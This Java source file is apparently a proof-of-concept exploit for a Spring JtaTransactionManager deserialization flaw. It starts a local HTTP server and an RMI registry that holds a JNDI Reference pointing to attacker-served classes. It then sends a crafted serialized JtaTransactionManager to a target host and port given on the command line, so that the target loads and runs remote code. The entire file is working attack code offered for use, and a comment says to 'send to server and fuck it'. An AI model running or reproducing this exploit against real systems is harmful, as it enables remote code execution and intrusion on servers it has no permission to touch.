package me.lightless.springtx;

import com.sun.jndi.rmi.registry.ReferenceWrapper;
import com.sun.net.httpserver.HttpExchange;
import com.sun.net.httpserver.HttpHandler;
import com.sun.net.httpserver.HttpServer;

import javax.naming.Reference;
import java.io.ByteArrayOutputStream;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.ObjectOutputStream;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

class HttpFileHandler implements HttpHandler {
    public void handle(HttpExchange httpExchange) {
        try {
            System.out.println("Request: "+httpExchange.getRemoteAddress()+" "+httpExchange.getRequestURI());
            InputStream inputStream = HttpFileHandler.class.getResourceAsStream(httpExchange.getRequestURI().getPath());
            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            while(inputStream.available()>0) {
                byteArrayOutputStream.write(inputStream.read());
            }

            byte[] bytes = byteArrayOutputStream.toByteArray();
            httpExchange.sendResponseHeaders(200, bytes.length);
            httpExchange.getResponseBody().write(bytes);
            httpExchange.close();
        } catch(Exception e) {
            e.printStackTrace();
        }
    }
}

public class exp {
    public static void main(String[] args) throws Exception {

        // target ip and port
        String ServerAddress = args[0];
        int ServerPort = Integer.parseInt(args[1]);

        // local http server port
        String localAddress = args[2];
        int localPort = Integer.parseInt(args[3]);

        // local RMI port
        int RMIPort = Integer.parseInt(args[4]);

        // start local HTTP server
        System.out.println("Start Local HTTP Server");
        HttpServer httpServer = HttpServer.create(new InetSocketAddress(localPort), 0);
        httpServer.createContext("/",new HttpFileHandler());
        httpServer.setExecutor(null);
        httpServer.start();

        // start local RMI server
        System.out.println("Creating RMI Registry");
        Registry registry = LocateRegistry.createRegistry(RMIPort);
        String factoryLocation = "http://" + localAddress + ":" + localPort + "/";
        Reference reference = new javax.naming.Reference("ExportObject","ExportObject", factoryLocation);
        ReferenceWrapper referenceWrapper = new com.sun.jndi.rmi.registry.ReferenceWrapper(reference);
        registry.bind("Object", referenceWrapper);
        String JNDIAddress = "rmi://127.0.0.1:" + RMIPort + "/Object";

        // Connect to target via socket.
        System.out.println("Connecting to target " + ServerAddress + ":" + ServerPort);
        Socket socket = new Socket(ServerAddress, ServerPort);
        System.out.println("Connect success.");

        // Build payload
        org.springframework.transaction.jta.JtaTransactionManager payload = new org.springframework.transaction.jta.JtaTransactionManager();
        payload.setUserTransactionName(JNDIAddress);

        // send to server and fuck it!
        // or you can write payload to file and do something else..
        // ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("payload.bin"));
        // oos.writeObject(payload);
        System.out.println("send payload to target!");
        ObjectOutputStream oos = new ObjectOutputStream(socket.getOutputStream());
        oos.writeObject(payload);
        oos.flush();
    }
}
